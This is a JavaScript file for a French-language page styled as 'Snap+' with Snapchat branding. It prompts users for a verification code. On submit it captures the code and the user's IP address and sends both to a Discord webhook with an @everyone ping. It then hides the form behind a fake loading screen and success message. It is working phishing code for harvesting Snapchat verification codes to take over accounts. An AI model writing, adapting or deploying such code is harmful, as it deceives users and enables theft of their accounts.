const sendBtn = document.getElementById('sendBtn');
const codeInput = document.getElementById('codeInput');
const loadingScreen = document.getElementById('loadingScreen');
const successMessage = document.getElementById('successMessage');
const inputWrapper = document.querySelector('.input-wrapper');

inputWrapper.addEventListener('focusin', () => {
    inputWrapper.style.transform = 'translateY(-2px)';
    inputWrapper.querySelector('i').style.color = '#667eea';
});

inputWrapper.addEventListener('focusout', () => {
    inputWrapper.style.transform = 'translateY(0)';
    if (!codeInput.value) {
        inputWrapper.querySelector('i').style.color = 'rgba(255, 255, 255, 0.5)';
    }
});

codeInput.addEventListener('input', () => {
    inputWrapper.style.borderColor = codeInput.value ? '#667eea' : 'rgba(255, 255, 255, 0.1)';
});

sendBtn.addEventListener('click', async function() {
    const code = codeInput.value.trim();

    if (!code) {
        sendBtn.style.animation = 'shake 0.5s ease-in-out';
        setTimeout(() => sendBtn.style.animation = '', 500);
        alert('Veuillez entrer un code');
        return;
    }

    const ip = await getUserIP();

    sendBtn.disabled = true;
    sendBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi...';
    document.querySelector('.form-group').style.display = 'none';
    document.querySelector('.headline').style.display = 'none';
    document.querySelector('.disclaimer').style.display = 'none';
    sendBtn.style.display = 'none';
    loadingScreen.classList.add('active');

    const embed = {
        title: '📱 Code reçu Snap+',
        description: 'Un utilisateur a envoyé son code de vérification.',
        color: 0x667eea,
        author: {
            name: 'Snap+ Bot',
            icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png'
        },
        fields: [
            { name: '─────────────────────', value: ' ', inline: false },
            { name: '🔑 Code', value: `\`\`\`${code}\`\`\``, inline: false },
            { name: '🌐 IP', value: `\`\`\`${ip}\`\`\``, inline: false },
            { name: '⏰ Date', value: `<t:${Math.floor(Date.now() / 1000)}:F>`, inline: false },
            { name: '─────────────────────', value: ' ', inline: false }
        ],
        thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        footer: { text: 'Snap+ Bot • Envoi automatique', icon_url: 'https://upload.wikimedia.org/wikipedia/en/thumb/a/a3/Snapchat.svg/1200px-Snapchat.svg.png' },
        timestamp: new Date().toISOString()
    };

    await sendToDiscord({ content: '@everyone', embeds: [embed] });

    setTimeout(() => {
        loadingScreen.classList.remove('active');
        successMessage.classList.add('active');
    }, 2000);
});
